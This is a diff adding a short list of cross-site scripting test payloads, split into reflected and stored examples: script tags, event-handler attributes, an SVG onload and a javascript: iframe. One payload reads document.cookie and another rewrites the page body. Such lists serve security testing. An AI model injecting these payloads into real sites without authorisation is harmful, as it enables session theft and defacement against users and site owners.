@@ -1,0 +1,22 @@
+XSS reflected
+
+<script>alert("XSS attack!");</script>
+<script>alert(document.cookie");</script>
+<img src="invalid-image" onerror="alert('XSS alert');">
+<a href="#" onclick="alert('XSS Click');">Click me</a>
+<input type="text" value="XSS" onfocus="alert('XSS Focus')" autofocus>
+
+
+
+
+
+XSS stored
+
+<script>alert("Stored XSS attack!");</script>
+<script>document.body.innerHTML="<h1>You've been hacked!</h1>";</script>
+<img src="nonexistent.jpg" onerror="alert('Stored XSS with img');">
+<input type="text" value="XSS"onfocus="alert('Stored XSS onfocus')" autofocus>
+<a href="#" onclick="alert('Stored XSS on click');">Click me</a>
+<div onmouseover="alert('Stored XSS on hover')"> Hover over this text!</div>
+<svg onload="alert('Stored XSS with SVG')"> </svg>
+<iframe src="javascript:alert('Stored XSS with iframe');"></iframe>
